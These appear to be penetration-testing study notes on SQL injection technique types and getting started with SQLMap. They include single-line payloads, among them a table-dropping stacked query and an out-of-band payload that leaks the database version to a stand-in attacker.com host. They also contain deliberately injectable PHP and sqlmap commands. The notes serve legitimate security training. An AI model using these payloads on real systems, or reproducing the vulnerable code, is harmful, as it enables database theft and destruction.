The technique characters `BEUSTQ` refers to the following:

- `B`: Boolean-based blind
- `E`: Error-based
- `U`: Union query-based
- `S`: Stacked queries
- `T`: Time-based blind
- `Q`: Inline queries
## Boolean-based blind SQL Injection
```sql
AND 1=1
```

## Error-based SQL Injection
```sql
AND GTID_SUBSET(@@version,0)
```

## UNION query-based
```sql
UNION ALL SELECT 1,@@version,3
```

## Stacked queries
```sql
; DROP TABLE users
```

## Time-based blind SQL Injection
```sql
AND 1=IF(2>1,SLEEP(5),0)
```

## Inline queries
```sql
SELECT (SELECT @@version) from
```

## Out-of-band SQL Injection
```sql
LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))
```

>Error-based SQLi is considered as faster than all other types, except UNION query-based, because it can retrieve a limited amount (e.g., 200 bytes) of data called "chunks" through each request.

# Getting Started with SQLMap

```shell-session
AhmaDb0x@htb[/htb]$ sqlmap -hh
```

## Basic Scenario
a penetration tester accesses the web page that accepts user input via a `GET` parameter (e.g., `id`). They then want to test if the web page is affected by the SQL injection vulnerability. If so, they would want to exploit it, retrieve as much information as possible from the back-end database, or even try to access the underlying file system and execute OS commands. An example SQLi vulnerable PHP code for this scenario would look as follows

```php
$link = mysqli_connect($host, $username, $password, $database, 3306);
$sql = "SELECT * FROM users WHERE id = " . $_GET["id"] . " LIMIT 0, 1";
$result = mysqli_query($link, $sql);
if (!$result)
    die("<b>SQL error:</b> ". mysqli_error($link) . "<br>\n");
```

`http://www.example.com/vuln.php?id=1`
```shell-session
AhmaDb0x@htb[/htb]$ sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
```

>Note: in this case, option '-u' is used to provide the target URL, while the switch '--batch' is used for skipping any required user-input, by automatically choosing using the default option.


# SQLMap Output Description

At the end of the previous section, the sqlmap output showed us a lot of info during its scan. This data is usually crucial to understand, as it guides us through the automated SQL injection process. This shows us exactly what kind of vulnerabilities SQLMap is exploiting, which helps us report what type of injection the web application has. This can also become handy if we wanted to manually exploit the web application once SQLMap determines the type of injection and vulnerable parameter.
